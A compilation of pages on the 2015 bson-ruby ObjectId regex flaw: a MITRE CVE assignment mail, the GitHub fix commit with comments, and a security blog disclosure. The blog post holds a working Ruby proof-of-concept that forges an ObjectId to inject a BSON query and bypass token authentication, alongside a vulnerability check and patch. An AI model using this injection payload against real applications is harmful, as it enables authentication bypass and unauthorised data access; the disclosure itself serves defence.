=== Content from www.openwall.com_8eb503b6_20250124_185543.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[<thread-prev]](1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20150606160350.CAD816C016E@smtpvmsrv1.mitre.org>
Date: Sat,  6 Jun 2015 12:03:50 -0400 (EDT)
From: cve-assign@...re.org
To: phillmv@...te.io
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: CVE Request: bson-ruby DoS and possible injection

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

> <http://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html>

As far as we can tell, this requires three CVE IDs because there were
three independent mistakes.

CVE-2015-4410 is for original 2012-01-23 implementation of legal?
using the ^[0-9a-f]{24}$ regular expression.

CVE-2015-4411 is for the bernerdschaefer 2012-04-17 commit in which
legal? began using the \A\h{24}\Z regular expression. The
mongo_ruby_regexp.html blog post describes this as "proper" but later
explains that it was problematic, in at least one context, because of
a minor DoS that would have been avoided if the correct \A\h{24}\z
(lowercase 'z') had been used instead.

CVE-2015-4412 is for the durran 2013-04-07 commit in which the
\A\h{24}\Z regular expression was changed to the ^[0-9a-f]{24}$
regular expression.

The copying of the original ^[0-9a-f]{24}$ mistake from Moped::BSON to
one or more other codebases doesn't require additional CVE IDs.

Similarly, the copying of the \A\h{24}\Z mistake or the second
^[0-9a-f]{24}$ mistake to one or more other codebases doesn't require
additional CVE IDs. (It's quite possible that no such copying ever
occurred.)

The claim in
<http://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html>
of:

  Regexp are just like cars - they should work as same and similar as
  it's possible. Breaking standard behavior by purpose and telling
  people "It's not a bug, it's a feature" looks so disgusting to me.
  It's not a feature, it's a vulnerability.

is not accepted as a Ruby vulnerability by the CVE project. There is
no CVE ID for the observation that Ruby regular-expression semantics
can be considered different from regular-expression semantics seen
elsewhere.

If there are other products (that otherwise qualify for CVE IDs) with
incorrect and security-relevant uses of ^$ in Ruby code, then there
can be additional CVE IDs for each independent codebase. For example,
referring to the "Showcases time" section of the
saferweb-injects-in-various-ruby.html page, there can't be a CVE ID
for GitHub.com (because it could be site-specific code) but there
could be a CVE ID if the issue affected a 2012 version (if one
existed) of the GitHub Enterprise product.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.14 (SunOS)

iQEcBAEBAgAGBQJVcxluAAoJEKllVAevmvmsrrcH/iywyYQPmcd+Bn6gkRKfxUsx
9TmAgV6lCztWgVR0kqTrBZC5GcACcZWV2jVEg/3RD3/fXH23ulqTvKZEZrbTVIHv
mDMH5WId3gimyNdy2IkNZqsKeeJxNi6rtWyg+QLD8M1+fLW9vrmRPYKN7VPcHWZX
ZTEauEFN0Gq+23hM01DUnXpnV1sErtGWceIXnvVKP1skyitgJYhz6SRmyL2+FQpc
iUAqTJUMeUlEvM40WxQPbX2Q7PeH0dIoNN4UmC2VE/RmzysIDhtaZQwsaFcMDpA3
wS8Lva/Ici4klxNUxdZsMEKxg1V7y1djlvRDbUlVpqHvrMZbTTkJraf8cbbZJik=
=o3AI
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_890b57ac_20250124_185545.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongodb%2Fbson-ruby%2Fcommit%2F976da329ff03ecdfca3030eb6efe3c85e6db9999)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongodb%2Fbson-ruby%2Fcommit%2F976da329ff03ecdfca3030eb6efe3c85e6db9999)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=mongodb%2Fbson-ruby)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mongodb](/mongodb)
/
**[bson-ruby](/mongodb/bson-ruby)**
Public

* [Notifications](/login?return_to=%2Fmongodb%2Fbson-ruby) You must be signed in to change notification settings
* [Fork
  106](/login?return_to=%2Fmongodb%2Fbson-ruby)
* [Star
   78](/login?return_to=%2Fmongodb%2Fbson-ruby)

* [Code](/mongodb/bson-ruby)
* [Pull requests
  0](/mongodb/bson-ruby/pulls)
* [Discussions](/mongodb/bson-ruby/discussions)
* [Actions](/mongodb/bson-ruby/actions)
* [Security](/mongodb/bson-ruby/security)
* [Insights](/mongodb/bson-ruby/pulse)

Additional navigation options

* [Code](/mongodb/bson-ruby)
* [Pull requests](/mongodb/bson-ruby/pulls)
* [Discussions](/mongodb/bson-ruby/discussions)
* [Actions](/mongodb/bson-ruby/actions)
* [Security](/mongodb/bson-ruby/security)
* [Insights](/mongodb/bson-ruby/pulse)

## Commit

[Permalink](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Use \A \z for checking regex on legal

[Browse files](/mongodb/bson-ruby/tree/976da329ff03ecdfca3030eb6efe3c85e6db9999)
Browse the repository at this point in the history

* Loading branch information

[![@durran](https://avatars.githubusercontent.com/u/9030?s=40&v=4)](/durran)

[durran](/mongodb/bson-ruby/commits?author=durran "View all commits by durran")
committed
Jun 4, 2015

1 parent
[7446d7c](/mongodb/bson-ruby/commit/7446d7c6764dfda8dc4480ce16d5c023e74be5ca)

commit 976da32

Showing
**1 changed file**
with
**1 addition**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[lib/bson/object\_id.rb](#diff-11914f217b3a32fe0c3ba79c90e8b3eff1b6c74fe4e710b448076792f362f3a0 "lib/bson/object_id.rb")

Show comments

[View file](/mongodb/bson-ruby/blob/976da329ff03ecdfca3030eb6efe3c85e6db9999/lib/bson/object_id.rb)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -282,7 +282,7 @@ def from\_time(time, options = {}) |
|  |  | # |
|  |  | # @since 2.0.0 |
|  |  | def legal?(string) |
|  |  | string.to\_s =~ /^[0-9a-f]{24}$/i ? true : false |
|  |  | string.to\_s =~ /\A[0-9a-f]{24}\z/i ? true : false |
|  |  | end |
|  |  |  |
|  |  | # Executes the provided block only if the size of the provided object is |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 6 comments on commit `976da32`

[![@judofyr](https://avatars.githubusercontent.com/u/499?s=80&v=4)](/judofyr)

Copy link

### @judofyr **[judofyr](/judofyr)** commented on `[976da32](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)` [Jun 4, 2015](#commitcomment-11525556)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Yay! Thanks for a quick patch.

Sorry, something went wrong.

All reactions

[![@cheald](https://avatars.githubusercontent.com/u/9830?s=80&v=4)](/cheald)

Copy link

### @cheald **[cheald](/cheald)** commented on `[976da32](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)` [Jun 4, 2015](#commitcomment-11528260)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Is the 1.x series going to see a patch? Users who aren't using bson\_ext (such as users on JRuby) are still vulnerable.

Sorry, something went wrong.

All reactions

[![@estolfo](https://avatars.githubusercontent.com/u/699369?s=80&v=4)](/estolfo)

Copy link

Contributor

### @estolfo **[estolfo](/estolfo)** commented on `[976da32](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)` [Jun 4, 2015](#commitcomment-11528290)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Yes, it will be released this afternoon.

Sorry, something went wrong.

All reactions

[![@estolfo](https://avatars.githubusercontent.com/u/699369?s=80&v=4)](/estolfo)

Copy link

Contributor

### @estolfo **[estolfo](/estolfo)** commented on `[976da32](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)` [Jun 4, 2015](#commitcomment-11528311)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

It's in master already.

Sorry, something went wrong.

All reactions

[![@cheald](https://avatars.githubusercontent.com/u/9830?s=80&v=4)](/cheald)

Copy link

### @cheald **[cheald](/cheald)** commented on `[976da32](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)` [Jun 4, 2015](#commitcomment-11528333)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Perfect, thanks. <https://github.com/mongodb/mongo-ruby-driver/blob/1.x-stable/lib/bson/types/object_id.rb> for anyone else who ends up here looking for it, like me. :)

Sorry, something went wrong.

All reactions

[![@estolfo](https://avatars.githubusercontent.com/u/699369?s=80&v=4)](/estolfo)

Copy link

Contributor

### @estolfo **[estolfo](/estolfo)** commented on `[976da32](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)` [Jun 4, 2015](#commitcomment-11529744)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

mongo 1.12.3 and bson 1.12.3 are released with this fix.

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongodb%2Fbson-ruby%2Fcommit%2F976da329ff03ecdfca3030eb6efe3c85e6db9999) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from sakurity.com_0e344286_20250124_185546.html ===


* [Home](/)
* [Blog](/blog)
* [Research](/research)
* [Contact Us](/contact)

# Mongo BSON Injection: Ruby Regexps Strike Again

TL;DR There’s a subtle bug in BSON-ruby implementation, leading in best case scenario to low-severity DoS, **but most likely to critical BSON Injection** (similar to SQL injection) - depends on gem versions you use.

3 years ago [I wrote a blog post](https://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html) about broken regular expressions in Ruby, `^$` meaning new lines `\n`. Back then I was only able to demonstrate XSS on Github and other websites using “javascript:a()\nhttps://”. I had a feeling there are much worse use cases of this vulnerability and here it is.

## Briefly About Gems

BSON is a binary-encoded serialization of JSON-like documents. MongoDB uses BSON as the data storage and network transfer format for “documents”.

Mongoid is an ODM (Object Document Mapper) Framework for MongoDB, written in Ruby. Mongo Mapper is another ODM but less popular one.

Moped gem is A MongoDB driver for Ruby.

So Mongoid uses more low-level adapter Moped which uses BSON-ruby (but used to have its own implementation). Mongo Mapper uses Plucky for parsing ObjectId, which also uses BSON-ruby.

Most likely you’re using Mongoid or Mongo Mapper, but technically the vulnerability is in `legal?` of BSON::ObjectId.

## A Tale of One Regression

`legal?` was created in Moped::BSON on Jan 23, 2012. It intended to verify the \_id from user input is hexdecimal and is exactly 24 symbols. It looked like this:

```
def legal?(str)
  !!str.match(/^[0-9a-f]{24}$/i)
end
```

But this nasty `^$`-using Ruby code didn’t survive long - [on Apr 17, 2012 it was silently replaced](https://github.com/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b#diff-3b93602f64c2fe46d38efd9f73ef5358R24) with proper `!!str.match(/\A\h{24}\Z/i)`

However, on March 31, 2013 Moped deleted internal BSON module and [switched to separate BSON gem](https://github.com/mongoid/moped/commit/b64f937590c69d72fa92255e4c66d3ec126b0ff5#diff-c299a9622b71e55450c761f853668d61R6)

![](/img/moped.png)

The `legal?` method successfully [migrated to mongodb/bson-ruby](https://github.com/mongodb/bson-ruby/commit/fef6f75413511d653c76bf924a932374a183a24f#diff-8c8558c185bbb548ccb5a6d6ac4bfee5R191) before that (on March 3).

But on Apr 7 [an interesting commit happens](https://github.com/mongodb/bson-ruby/commit/21141c78d99f23d5f34d32010557ef19d0f77203#diff-8c8558c185bbb548ccb5a6d6ac4bfee5L219). @durran (the maintainer of all those repos), replaces `/\A\h{24}\Z/ === string.to_s` with vulnerable `string.to_s =~ /^[0-9a-f]{24}$/i ? true : false`.

So from Apr 17 2012 to March 31 2013 moped used ^$, \A\Z until Apr 7 2013, and then ^$ until now.

## Am I Vulnerable?

I see, you’re getting bored. Run this code to see if you’re vulnerable:

```
b=((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId)
raise "DoS!" if b.legal? "a"*24+"\n"
raise "Injection!" if b.legal? "a"*24+"\na"
```

And use this patch if you indeed are! Don’t forget to alert others.

```
def ((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId).legal?(s)
  /\A\h{24}\z/ === s.to_s
end
```
## The Vulnerability

If you’re lucky enough and use old version of Moped, only light version of DoS is possible.

Wait, did I mention another reason why Regexps in Ruby are horribly designed? There’s \A meaning the beginning and there’s \Z meaning the ending… or a new line. You’re supposed to know it. Because only \z means the ending. But most people don’t care the last `\n`.

![](/img/moped2.png)

So if you send something like `aaaaaaaaaaaaaaaaaaaaaaaa%0A` (with trailing `\n`), the `legal?` method will still return `true` because \Z allows the new line. But when Mongo DB receives a corrupted ObjectId it responds with `[conn1] Assertion: 10307:Client Error: bad object in message: invalid bson type in object with _id: ObjectId('aaaaaaaaaaaaaaaaaaaaaaaa')`.

Which would be OK if Moped properly reacted, but currently it thinks Mongo is down and pings it 39 more times with intervals. In other words it keeps the worker busy for 5 seconds and makes x40 requests to Mongo DB. One way or another, it is Denial of Service.

But if you’re using a newer version of BSON-ruby with ^$, the attacker can send any data to the socket with something like \_id=`Any binary data\naaaaaaaaaaaaaaaaaaaaaaaa\nAny binary data`. With following PoC we can bypass any auth token-based system, easily DoS your app, and probably more nasty things - we can write any kind of requests to the socket!

```
require 'uri'
b = BSON::Document.new
b["$query"] = {"token" => {"$gt"=>""}}

payload = b.to_bson[4..-2]
id_ish = ("\n\n" + "a"*24 + "\n\n")

fake_id = "a"*24 +
  "\x02_id\0".unpack('H*')[0] +
  [id_ish.size/2 + 1].pack('V').unpack('H*')[0] + id_ish + "00" +
  payload.unpack('H*')[0]

puts URI.encode(fake_id) # looks like:
# aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000

User.find fake_id #returns <User _id: 556f840f686f6d6746000000, token: "a">
```

Thanks to [@judofyr](https://twitter.com/judofyr) for the help with this PoC!

ObjectId is unpacked from hex string and injected as-is into the socket (not sanitized for performance reasons, it’s supposed to be valid ObjectId). It breaks BSON format and redefines or defines new parameters of the BSON object.

\x83\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xD4\a\x00\x00\x00\x00\x00\x00
mng\_development.users\x00\x00\x00\x00\x00\x00\x00\x00\x00Q\x00\x00\x00\a\_id**\x00
\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x02\_id\x00\x0F\x00\x00\x00\xAA
\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x00\x03$query\x00\e\x00\x00
\x00\x03token\x00\x0F\x00\x00\x00\x02$gt\x00\x01**\x00\x00\x00\x00\x00\x00\x00

Implications of this vulnerability can be huge, so patch your systems asap. Another post about dangers of BSON is coming soon, and that one impacts all platforms.

### Jun 4, 2015 • Egor Homakov ([@homakov](https://twitter.com/homakov))

#### Sakurity

* [Home](/)
* [Blog](/blog)
* [Research](/research)
* [Contact Us](/contact)

Sakurity Ltd, a Hong Kong company established in 2012.



=== Content from access.redhat.com_330e736d_20250126_025540.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

